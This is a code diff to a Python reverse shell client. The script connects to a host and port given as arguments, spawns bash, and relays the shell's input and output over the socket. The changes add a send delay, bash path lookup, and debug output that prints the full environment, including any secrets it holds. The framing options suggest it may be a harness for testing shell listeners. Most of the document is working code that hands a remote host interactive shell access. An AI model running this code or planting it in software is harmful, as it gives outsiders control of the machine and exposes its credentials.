@@ -7,6 +7,7 @@ import sys
 import time
 import threading
 from subprocess import PIPE
+from subprocess import check_output
 from subprocess import Popen
 from subprocess import STDOUT
 
@@ -48,8 +49,16 @@ class IOCommand(object):
     """IOCommand instance."""
 
     def __init__(self, executable):
+        print("Command: finding path of: {}".format(executable))
+        output = check_output(["which", executable])
+        output = output.rstrip()
+        self.cmd = str(output.decode())
+        print("Command: found path: {}".format(self.cmd))
+
+        print("Command: Getting env")
         self.env = os.environ.copy()
-        self.cmd = executable
+        print("Command: env: {}".format(repr(self.env)))
+
         self.proc = Popen(
             self.cmd,
             stdin=PIPE,
@@ -102,7 +111,7 @@ class IONetwork(object):
                 print("Network Received: {}".format(repr(data)))
             yield data
 
-    def send(self, data, send_one_byte, prefix1=None, prefix2=None, suffix1=None, suffix2=None):
+    def send(self, data, send_one_byte, send_delay, prefix1=None, prefix2=None, suffix1=None, suffix2=None):
         """Network send."""
         # Do we send a prefix before all command output?
         if prefix1 is not None:
@@ -114,6 +123,7 @@ class IONetwork(object):
         sent = 0
         if send_one_byte:
             for char in data:
+                time.sleep(send_delay)
                 try:
                     # Python2
                     sent += self.sock.send(char)
@@ -124,6 +134,7 @@ class IONetwork(object):
                     print("Sending: {}".format(repr(bytes([char]))))
         else:
             while sent < size:
+                time.sleep(send_delay)
                 sent += self.sock.send(data)
 
         # Do we send a suffx after all command output?
@@ -139,18 +150,27 @@ def main(argv):
     host = argv[1]
     port = int(argv[2])
     send_one_byte = True if len(argv) > 3 and argv[3] == "1" else False
-    banner = argv[4] if len(argv) > 4 and argv[4] else None
-    prefix1 = argv[5] if len(argv) > 5 and argv[5] else None
-    prefix2 = argv[6] if len(argv) > 6 and argv[6] else None
-    suffix1 = argv[7] if len(argv) > 7 and argv[7] else None
-    suffix2 = argv[8] if len(argv) > 8 and argv[8] else None
+    send_delay = float(argv[4]) if len(argv) > 4 and argv[4] else float(0.0)
+    banner = argv[5] if len(argv) > 5 and argv[5] else None
+    prefix1 = argv[6] if len(argv) > 6 and argv[6] else None
+    prefix2 = argv[7] if len(argv) > 7 and argv[7] else None
+    suffix1 = argv[8] if len(argv) > 8 and argv[8] else None
+    suffix2 = argv[9] if len(argv) > 9 and argv[9] else None
+
+    if send_one_byte:
+        print("[SEND MODE]: sending one byte at a time.")
+    else:
+        print("[SEND MODE]: sending all bytes.")
+
+    print("[SEND MODE]: Delaying send by {} seconds".format(send_delay))
+
 
     print("Connecting to {}:{}".format(host, port))
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
     print("Connected to {}:{}".format(host, port))
 
-    command = IOCommand("/bin/sh")
+    command = IOCommand("bash")
     network = IONetwork(s)
 
     def exec_cmd(producer, consumer):
@@ -170,6 +190,7 @@ def main(argv):
         except UnicodeDecodeError:
             pass
         print("[MODE]: sending banner: {}".format(repr(banner)))
+        time.sleep(send_delay)
         s.sendall(banner)
 
     # Prepare prefix
@@ -199,6 +220,7 @@ def main(argv):
         except UnicodeDecodeError:
             pass
         print("[MODE]: sending suffix1: {}".format(repr(suffix1)))
+        time.sleep(send_delay)
         s.send(suffix1)
     if suffix2 is not None:
         suffix2 = suffix2.replace("\\n", "\n")
@@ -208,6 +230,7 @@ def main(argv):
         except UnicodeDecodeError:
             pass
         print("[MODE]: sending suffix2: {}".format(repr(suffix2)))
+        time.sleep(send_delay)
         s.send(suffix2)
 
     q = MyQueue()
@@ -230,7 +253,7 @@ def main(argv):
                 # Fetch all items and send them at once
                 while not q.empty():
                     data.append(q.get())
-                network.send(b"".join(data), send_one_byte, prefix1, prefix2, suffix1, suffix2)
+                network.send(b"".join(data), send_one_byte, send_delay, prefix1, prefix2, suffix1, suffix2)
                 data = []
                 # flush
         oldsize = newsize
